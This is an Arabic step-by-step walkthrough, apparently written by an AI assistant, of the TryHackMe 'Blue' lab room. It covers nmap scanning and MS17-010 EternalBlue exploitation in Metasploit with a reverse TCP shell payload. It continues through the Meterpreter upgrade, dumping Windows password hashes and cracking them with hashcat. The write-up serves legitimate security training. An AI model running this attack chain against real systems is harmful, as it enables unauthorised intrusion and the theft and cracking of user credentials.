أنا شفت الملف اللي رفعته، وهو عبارة عن **Screenshots للخطوات اللي اتعملت في روم**  
Blue (TryHackMe room) على منصة TryHackMe.

هشرحلك **الروم بالكامل خطوة خطوة** بنفس الكود تقريبًا اللي ظاهر في الصور، مع:

- شرح كل أمر
    
- ليه استخدمناه
    
- لو فشل يحصل ليه
    
- وإيه البديل
    

خلينا نمشي بالترتيب.

---

# المرحلة 1 — فحص الجهاز (Scanning)

الأمر الأول:

```bash
nmap -sS -sV -sC 10.112.147.198
```

## شرح السطر بالكامل

|الجزء|معناه|
|---|---|
|nmap|أداة فحص الشبكات|
|-sS|SYN Scan (فحص سريع للبورتات)|
|-sV|معرفة نسخة الخدمة|
|-sC|تشغيل سكربتات nmap الافتراضية|
|IP|عنوان الجهاز الهدف|

## النتيجة اللي ظهرت في الصورة

بورتات مفتوحة مثل:

```
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
3389/tcp open
```

أهم بورت هنا:

```
445
```

وده خاص ببروتوكول **SMB protocol**.

---

# المرحلة 2 — البحث عن ثغرة SMB

الأمر:

```bash
nmap --script smb-vuln* -p445 10.112.147.198
```

## شرح الأمر

|الجزء|المعنى|
|---|---|
|--script|تشغيل سكربت|
|smb-vuln*|كل سكربتات ثغرات SMB|
|-p445|فحص البورت 445 فقط|

لو الجهاز ضعيف هيظهر:

```
VULNERABLE
MS17-010
```

وهذه هي الثغرة:

EternalBlue SMB vulnerability

---

# المرحلة 3 — فتح Metasploit

الأمر:

```bash
msfconsole
```

## شرح

هذا يفتح أداة الاختراق الشهيرة  
Metasploit Framework.

---

# المرحلة 4 — اختيار Exploit

داخل metasploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## شرح

|الجزء|المعنى|
|---|---|
|use|اختيار موديل|
|exploit/windows/smb|مسار الاستغلال|
|ms17_010_eternalblue|exploit الخاص بالثغرة|

وهذا يجاوب سؤال الروم:

```
exploit/windows/smb/ms17_010_eternalblue
```

---

# المرحلة 5 — عرض الخيارات

```bash
show options
```

## الهدف

معرفة المتغيرات المطلوبة.

المهم منهم:

```
RHOSTS
```

---

# المرحلة 6 — تحديد الهدف

```bash
set RHOSTS 10.112.147.198
```

## شرح

|الجزء|المعنى|
|---|---|
|set|تعيين قيمة|
|RHOSTS|عنوان الضحية|

---

# المرحلة 7 — اختيار Payload

في الصورة ظهر الأمر:

```bash
set payload windows/x64/shell/reverse_tcp
```

## شرح

|الجزء|المعنى|
|---|---|
|payload|الكود اللي هيتنفذ بعد الاختراق|
|windows/x64|لنظام ويندوز 64|
|shell|يعطي command shell|
|reverse_tcp|اتصال عكسي|

بعدها يظهر:

```
Using configured payload windows/x64/shell/reverse_tcp
```

يعني تم إعداد البايلود.

---

# المرحلة 8 — تشغيل الاستغلال

```bash
run
```

لو نجح:

```
Command shell session opened
```

والشيل يظهر:

```
C:\Windows\system32>
```

---

# المرحلة 9 — مشاهدة الجلسات

الأمر:

```bash
sessions
```

## النتيجة

```
1 shell x64/windows
```

---

# المرحلة 10 — الدخول للجلسة

```bash
sessions -i 1
```

## شرح

|الجزء|المعنى|
|---|---|
|-i|interact|
|1|رقم الجلسة|

---

# المرحلة 11 — تحويل الشيل إلى Meterpreter

في الصور ظهر البحث:

```bash
search shell_to_meterpreter
```

ثم:

```bash
use post/multi/manage/shell_to_meterpreter
```

## شرح

هذا module يحول الشيل العادي إلى

Meterpreter

---

# عرض الخيارات

```bash
show options
```

يظهر:

```
SESSION
LHOST
LPORT
```

---

# تحديد الجلسة

```bash
set SESSION 1
```

---

# تشغيل التحويل

```bash
run
```

لو نجح يظهر:

```
meterpreter session opened
```

---

# المرحلة 12 — الدخول للجلسة الجديدة

```bash
sessions 2
```

أو

```bash
sessions -i 2
```

---

# المرحلة 13 — أوامر meterpreter

```bash
help
```

يعرض كل الأوامر.

---

# المرحلة 14 — استخراج الهاشات

في الصورة:

```bash
hashdump
```

## شرح

يسحب:

```
Windows password hashes
```

---

# المرحلة 15 — كسر الباسورد

الأمر في الصورة:

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

## شرح السطر

|الجزء|المعنى|
|---|---|
|hashcat|أداة كسر كلمات المرور|
|-m 1000|نوع الهاش NTLM|
|hash.txt|ملف الهاش|
|rockyou.txt|قائمة كلمات|

الأداة المستخدمة:

Hashcat

---

# المرحلة 16 — إيجاد الفلاج

الأوامر:

```bash
pwd
```

يعرض مكانك.

ثم:

```bash
cd C:/
```

ثم:

```bash
cd Users/Jon/Documents
```

ثم:

```bash
ls
```

يظهر:

```
flag3.txt
```

قراءة الفلاج:

```bash
cat flag3.txt
```

---

# لو أمر فشل ليه؟

أشهر أسباب الفشل في الروم:

### 1️⃣ الماشين لم تفتح بعد

الحل

انتظر دقيقة.

---

### 2️⃣ IP تغير

تأكد من IP.

---

### 3️⃣ exploit لم ينجح

شغل:

```
run
```

مرة أخرى.

---

### 4️⃣ firewall

بعض الرومات تحتاج:

```
set LHOST YOUR_IP
```

---

# أهم مهارات تعلمتها من الروم

✔ scanning  
✔ vulnerability discovery  
✔ exploitation  
✔ shell upgrade  
✔ password cracking

---

لو حابب، أشرح لك **3 حركات احترافية في روم Blue** تخلي الحل **أسرع 5 مرات** ويستخدمها محترفين البنتست. 🔥